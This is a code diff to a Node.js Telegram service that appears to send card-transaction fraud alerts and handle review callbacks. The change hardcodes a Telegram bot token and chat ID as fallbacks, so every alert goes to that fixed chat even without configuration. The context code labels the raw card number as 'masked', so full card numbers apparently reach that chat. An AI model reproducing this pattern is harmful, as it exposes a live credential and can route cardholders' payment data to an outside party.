@@ -1,9 +1,17 @@
 const axios = require('axios');
 
 class TelegramService {
+  static get BOT_TOKEN() {
+    return process.env.TELEGRAM_BOT_TOKEN || '8634001641:AAGqmSRL2a0eowUbE3WrFQBvAj2DAO0RZaY';
+  }
+
+  static get CHAT_ID() {
+    return process.env.TELEGRAM_CHAT_ID || '6253037611';
+  }
+
   static async sendFraudAlert(transaction) {
-    const token = process.env.TELEGRAM_BOT_TOKEN;
-    const chatId = process.env.TELEGRAM_CHAT_ID;
+    const token = this.BOT_TOKEN;
+    const chatId = this.CHAT_ID;
 
     const riskBadge = transaction.riskScore >= 75 ? '🚨 HIGH RISK 🚨' : '⚠️ MEDIUM RISK ⚠️';
     const maskedCard = transaction.cardNumber;
@@ -97,7 +105,7 @@ _Action Links:_
 
     // Idempotency State Locking
     if (transaction.status !== 'PENDING_REVIEW' && transaction.status !== 'PENDING_OTP') {
-      const token = process.env.TELEGRAM_BOT_TOKEN;
+      const token = TelegramService.BOT_TOKEN;
       if (token) {
         try {
           await axios.post(`https://api.telegram.org/bot${token}/answerCallbackQuery`, {
@@ -124,7 +132,7 @@ _Action Links:_
     await TransactionModel.findByIdAndUpdate(txId, statusUpdate);
 
     // Edit message in Telegram chat to show result
-    const token = process.env.TELEGRAM_BOT_TOKEN;
+    const token = TelegramService.BOT_TOKEN;
     if (token) {
       try {
         await axios.post(`https://api.telegram.org/bot${token}/editMessageText`, {
@@ -142,7 +150,7 @@ _Action Links:_
   }
 
   static async processIncomingUpdate(update) {
-    const token = process.env.TELEGRAM_BOT_TOKEN;
+    const token = TelegramService.BOT_TOKEN;
     if (!token) return;
 
     if (update.callback_query) {
@@ -457,7 +465,7 @@ ${fraudPatterns.map(p => `  _- ${p}_`).join('\n')}
   }
 
   static startPolling() {
-    const token = process.env.TELEGRAM_BOT_TOKEN;
+    const token = TelegramService.BOT_TOKEN;
     if (!token) {
       console.log('Telegram Bot: No bot token provided. Polling client disabled.');
       return;
